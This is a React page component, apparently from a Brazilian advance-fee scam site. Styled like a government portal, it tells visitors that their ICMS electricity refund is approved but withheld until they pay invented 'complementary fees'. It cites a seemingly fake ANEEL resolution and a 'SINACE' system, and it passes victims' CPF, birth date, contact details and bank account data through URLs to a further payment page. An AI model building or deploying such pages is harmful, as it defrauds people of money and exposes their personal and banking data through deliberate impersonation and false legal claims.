import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { AlertTriangle, CheckCircle2, Info, Clock, DollarSign, FileText, ReceiptText, HelpCircle } from "lucide-react";
import { Link, useLocation, useRoute } from "wouter";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { Badge } from "@/components/ui/badge";
import { useToast } from "@/hooks/use-toast";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import ScrollToTop from "@/components/ScrollToTop";

// Funções de formatação
const formatarCPF = (cpf: string) => {
  return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
};

const formatarMoeda = (valor: number | string) => {
  const valorNumerico = typeof valor === 'string' ? parseFloat(valor) : valor;
  return valorNumerico.toLocaleString('pt-BR', {
    style: 'currency',
    currency: 'BRL',
  });
};

const formatarData = (dataString: string) => {
  const data = new Date(dataString);
  return data.toLocaleDateString('pt-BR', {
    day: '2-digit',
    month: '2-digit',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit'
  });
};

export default function TaxaComplementar() {
  const [location, setLocation] = useLocation();
  const { toast } = useToast();
  
  // Valores das taxas de conformidade
  const VALOR_TAXA_CONFORMIDADE = 118;
  const VALOR_TAXA_EMISSAO = 48.6;
  
  // Estados para armazenar dados da solicitação
  const [protocolo, setProtocolo] = useState("");
  const [dataAtual, setDataAtual] = useState("");
  const [dataPagamento, setDataPagamento] = useState("");
  const [dadosSolicitacao, setDadosSolicitacao] = useState({
    nome: "",
    cpf: "",
    valor: "0",
    companhia: "",
    estado: "",
    dataNascimento: "",
    email: "",
    telefone: "",
    agencia: "",
    conta: "",
    pagamentoId: ""
  });
  
  // Obter parâmetros da URL
  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    
    // Definir protocolo baseado no CPF
    const cpf = urlParams.get('cpf') || "";
    if (cpf) {
      setProtocolo(`${cpf.substring(0, 4)}4714${cpf.substring(6, 9)}`);
    }
    
    // Definir data atual e data estimada de pagamento
    const dataHoje = new Date();
    setDataAtual(dataHoje.toLocaleDateString('pt-BR'));
    
    // Definir data do pagamento da primeira taxa
    const dataPagamentoParam = urlParams.get('dataPagamento');
    if (dataPagamentoParam) {
      setDataPagamento(formatarData(dataPagamentoParam));
    } else {
      setDataPagamento(dataHoje.toLocaleDateString('pt-BR', {
        day: '2-digit',
        month: '2-digit',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit'
      }));
    }
    
    // Preencher dados da solicitação
    setDadosSolicitacao({
      nome: urlParams.get('nome') || "",
      cpf: urlParams.get('cpf') || "",
      valor: urlParams.get('valor') || "0",
      companhia: urlParams.get('companhia') || "",
      estado: urlParams.get('estado') || "",
      dataNascimento: urlParams.get('nasc') || "",
      email: urlParams.get('email') || "",
      telefone: urlParams.get('telefone') || "",
      agencia: urlParams.get('agencia') || "",
      conta: urlParams.get('conta') || "",
      pagamentoId: urlParams.get('pagamentoId') || ""
    });
  }, []);
  
  // Função para prosseguir para a confirmação da taxa
  const prosseguirParaTaxaComplementar = () => {
    // Criar os parâmetros da URL para passar adiante
    const params = new URLSearchParams();
    
    // Adicionar todos os dados necessários para a próxima página
    Object.entries(dadosSolicitacao).forEach(([key, value]) => {
      params.append(key, value);
    });
    
    params.append('valorTaxaConformidade', VALOR_TAXA_CONFORMIDADE.toString());
    params.append('valorTaxaEmissao', VALOR_TAXA_EMISSAO.toString());
    params.append('protocolo', protocolo);
    
    // Redirecionar para a página de pagamento da taxa complementar
    setTimeout(() => {
      setLocation(`/taxa-final?${params.toString()}`);
    }, 500);
  };
  
  // Calcula valores formatados
  const valorRestituicaoFormatado = formatarMoeda(parseFloat(dadosSolicitacao.valor));
  const valorTaxaConformidadeFormatado = formatarMoeda(VALOR_TAXA_CONFORMIDADE);
  const valorTaxaEmissaoFormatado = formatarMoeda(VALOR_TAXA_EMISSAO);
  const valorTotalTaxasFormatado = formatarMoeda(VALOR_TAXA_CONFORMIDADE + VALOR_TAXA_EMISSAO);
  const cpfFormatado = dadosSolicitacao.cpf ? formatarCPF(dadosSolicitacao.cpf) : "";
  
  return (
    <>
      <ScrollToTop />
      <Header />
      <main className="container mx-auto px-2 py-4 min-h-screen">
        <div className="p-3 sm:p-4 relative bg-gray-50 rounded-lg shadow-md w-full mx-auto">
          {/* Cabeçalho com informações da restituição */}
          <div className="bg-[#1351B4] text-white p-4 rounded-md mb-5 shadow-sm">
            <div className="flex flex-col md:flex-row md:justify-between md:items-center gap-3">
              <div className="text-left">
                <div className="flex items-center mb-1">
                  <FileText className="mr-2 h-5 w-5 text-white" />
                  <h3 className="font-bold text-lg">Restituição de ICMS</h3>
                </div>
                <div className="bg-[#0C4DA2] text-white text-xs px-2 py-1 rounded inline-flex items-center">
                  <Info size={12} className="mr-1" />
                  Protocolo nº {protocolo}
                </div>
              </div>
              <div className="text-right bg-[#0C4DA2] rounded-md p-3">
                <p className="font-medium text-white text-sm mb-1">Valor aprovado:</p>
                <p className="font-bold text-lg text-white">{valorRestituicaoFormatado}</p>
                <div className="flex items-center justify-end mt-1 text-xs text-white">
                  <Clock size={12} className="mr-1" />
                  <span>Pagamento da TRE: <span className="font-medium">{dataPagamento}</span></span>
                </div>
              </div>
            </div>
          </div>
          
          {/* Alerta de status */}
          <div className="mb-6">
            <Alert className="border-amber-500 bg-amber-50">
              <AlertTriangle className="h-5 w-5 text-amber-600" />
              <AlertTitle className="font-bold text-amber-800">Status da Restituição: EM PROCESSAMENTO</AlertTitle>
              <AlertDescription className="text-amber-700">
                Seu pagamento da Taxa de Regularização (TRE) foi confirmado. Para concluir o processo de liberação, 
                é necessário o pagamento das taxas complementares abaixo.
              </AlertDescription>
            </Alert>
          </div>
          
          {/* Mensagem sobre processo de liberação */}
          <div className="bg-[#1351B4] text-white py-3 px-4 rounded-t-md font-semibold text-sm flex items-center mb-0">
            <div className="bg-white/20 p-1.5 rounded-md mr-2">
              <ReceiptText className="h-4 w-4" />
            </div>
            PROCESSO DE LIBERAÇÃO DA RESTITUIÇÃO
          </div>
          <div className="border border-t-0 border-gray-200 rounded-b-md p-5 bg-white shadow-sm mb-6">
            <div className="space-y-4">
              <div className="flex items-start">
                <div className="bg-green-500 rounded-full p-2 text-white mt-0.5 mr-3 flex-shrink-0">
                  <CheckCircle2 className="h-4 w-4" />
                </div>
                <div>
                  <p className="font-semibold text-gray-800">Taxa de Regularização Energética (TRE)</p>
                  <p className="text-sm text-gray-600">Você já realizou o pagamento da TRE com sucesso. Seu pedido foi validado e está em processamento.</p>
                </div>
              </div>
              
              <div className="flex items-start">
                <div className="bg-amber-500 rounded-full p-2 text-white mt-0.5 mr-3 flex-shrink-0">
                  <AlertTriangle className="h-4 w-4" />
                </div>
                <div>
                  <p className="font-semibold text-gray-800">Taxa de Conformidade Nacional</p>
                  <p className="text-sm text-gray-600">Esta taxa é necessária para validação do seu crédito no Sistema Nacional de Compensações Elétricas (SINACE).</p>
                  <Badge variant="outline" className="mt-1 bg-amber-50 text-amber-700 border-amber-200">Pendente</Badge>
                </div>
              </div>
              
              <div className="flex items-start">
                <div className="bg-amber-500 rounded-full p-2 text-white mt-0.5 mr-3 flex-shrink-0">
                  <AlertTriangle className="h-4 w-4" />
                </div>
                <div>
                  <p className="font-semibold text-gray-800">Taxa de Emissão de Documento Final</p>
                  <p className="text-sm text-gray-600">Necessária para a emissão e registro do documento oficial de restituição junto à concessionária.</p>
                  <Badge variant="outline" className="mt-1 bg-amber-50 text-amber-700 border-amber-200">Pendente</Badge>
                </div>
              </div>
            </div>
          </div>
          
          {/* Detalhes das taxas */}
          <div className="bg-[#1351B4] text-white py-3 px-4 rounded-t-md font-semibold text-sm flex items-center mb-0">
            <div className="bg-white/20 p-1.5 rounded-md mr-2">
              <DollarSign className="h-4 w-4" />
            </div>
            TAXAS COMPLEMENTARES PARA LIBERAÇÃO
          </div>
          <div className="border border-t-0 border-gray-200 rounded-b-md p-5 bg-white shadow-sm mb-6">
            <div className="grid grid-cols-1 gap-5">
              <Card className="border-amber-200 bg-amber-50">
                <CardHeader className="pb-2">
                  <CardTitle className="text-base text-amber-800 flex items-center">
                    <div className="bg-amber-500 p-1.5 rounded-md mr-2 flex items-center justify-center">
                      <ReceiptText className="h-4 w-4 text-white" />
                    </div>
                    Taxa de Conformidade Nacional
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="flex justify-between items-center mb-2">
                    <span className="text-amber-700 text-sm">Valor:</span>
                    <span className="font-bold text-lg text-amber-800">{valorTaxaConformidadeFormatado}</span>
                  </div>
                  
                  <p className="text-xs text-amber-700 mt-2 border-t border-amber-200 pt-2">
                    A Taxa de Conformidade Nacional é exigida pela Resolução ANEEL nº 1.042/2022 para validar sua 
                    restituição no Sistema Nacional de Compensações Elétricas (SINACE) e garantir a transferência 
                    dos valores entre a concessionária e o consumidor.
                  </p>
                </CardContent>
              </Card>
              
              <Card className="border-amber-200 bg-amber-50">
                <CardHeader className="pb-2">
                  <CardTitle className="text-base text-amber-800 flex items-center">
                    <div className="bg-amber-500 p-1.5 rounded-md mr-2 flex items-center justify-center">
                      <FileText className="h-4 w-4 text-white" />
                    </div>
                    Taxa de Emissão de Documento Final
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="flex justify-between items-center mb-2">
                    <span className="text-amber-700 text-sm">Valor:</span>
                    <span className="font-bold text-lg text-amber-800">{valorTaxaEmissaoFormatado}</span>
                  </div>
                  
                  <p className="text-xs text-amber-700 mt-2 border-t border-amber-200 pt-2">
                    A Taxa de Emissão de Documento Final cobre os custos administrativos para processamento, 
                    emissão e registro da documentação oficial que comprova sua restituição junto à concessionária 
                    de energia elétrica e órgãos reguladores.
                  </p>
                </CardContent>
              </Card>
              
              <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
                <div className="flex items-start">
                  <div className="bg-[#1351B4] rounded-full p-2 text-white mt-0.5 mr-3 flex-shrink-0">
                    <Info className="h-4 w-4" />
                  </div>
                  <div>
                    <p className="text-[#071D41] font-semibold">Valor total das taxas complementares</p>
                    <div className="flex justify-between items-center mt-2">
                      <span className="text-sm text-gray-700">Taxa de Conformidade Nacional:</span>
                      <span className="font-medium text-gray-800">{valorTaxaConformidadeFormatado}</span>
                    </div>
                    <div className="flex justify-between items-center mt-1">
                      <span className="text-sm text-gray-700">Taxa de Emissão de Documento Final:</span>
                      <span className="font-medium text-gray-800">{valorTaxaEmissaoFormatado}</span>
                    </div>
                    <div className="flex justify-between items-center mt-2 pt-2 border-t border-blue-200">
                      <span className="text-sm font-bold text-gray-800">Total a pagar:</span>
                      <span className="font-bold text-[#1351B4] text-lg">{valorTotalTaxasFormatado}</span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            
            {/* Botão para prosseguir */}
            <div className="mt-6">
              <Button 
                onClick={prosseguirParaTaxaComplementar}
                className="w-full font-bold py-6 text-lg bg-green-600 hover:bg-green-700 text-white shadow-md"
              >
                <div className="flex items-center justify-center">
                  <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                  </svg>
                  Prosseguir com o Pagamento
                </div>
              </Button>
              
              <p className="text-center text-xs text-gray-500 mt-3">
                Ao prosseguir, você concorda com os termos e condições para finalização do processo de restituição.
              </p>
            </div>
          </div>
          
          {/* Seção de FAQ */}
          <div>
            <div className="bg-[var(--gov-blue-dark)] text-white py-2 px-3 rounded-t-md font-semibold text-sm flex items-center">
              <HelpCircle className="h-4 w-4 mr-2" />
              PERGUNTAS FREQUENTES
            </div>
            <div className="border border-t-0 border-gray-300 rounded-b-md p-4 bg-white mb-4">
              <div className="space-y-4">
                <div className="border-b border-gray-200 pb-4">
                  <h3 className="font-medium text-[var(--gov-blue-dark)] mb-2">1. O que são as taxas complementares?</h3>
                  <p className="text-sm text-gray-600">
                    As taxas complementares são valores necessários para a conclusão do processo de restituição, 
                    cobrindo os custos de validação nacional e emissão de documentos oficiais conforme exigido pela 
                    resolução ANEEL nº 1.042/2022.
                  </p>
                </div>
                
                <div className="border-b border-gray-200 pb-4">
                  <h3 className="font-medium text-[var(--gov-blue-dark)] mb-2">2. O que acontece se eu não pagar as taxas complementares?</h3>
                  <p className="text-sm text-gray-600">
                    Sem o pagamento das taxas complementares, sua restituição ficará pendente no sistema e não poderá 
                    ser finalizada. Os valores já pagos serão mantidos em seu cadastro, mas a liberação do crédito só 
                    ocorrerá após a conclusão de todas as etapas.
                  </p>
                </div>
                
                <div className="border-b border-gray-200 pb-4">
                  <h3 className="font-medium text-[var(--gov-blue-dark)] mb-2">3. Por que preciso pagar a Taxa de Conformidade Nacional?</h3>
                  <p className="text-sm text-gray-600">
                    A Taxa de Conformidade Nacional é necessária para validar sua restituição no Sistema Nacional de 
                    Compensações Elétricas (SINACE), garantindo que seu crédito seja reconhecido em território nacional 
                    e possa ser transferido da concessionária para você.
                  </p>
                </div>
                
                <div>
                  <h3 className="font-medium text-[var(--gov-blue-dark)] mb-2">4. Quanto tempo leva para receber minha restituição após o pagamento?</h3>
                  <p className="text-sm text-gray-600">
                    Após o pagamento de todas as taxas complementares, o valor da sua restituição será depositado na 
                    conta bancária informada em até 72 horas úteis, conforme determinado pela ANEEL.
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>
      <Footer />
    </>
  );
}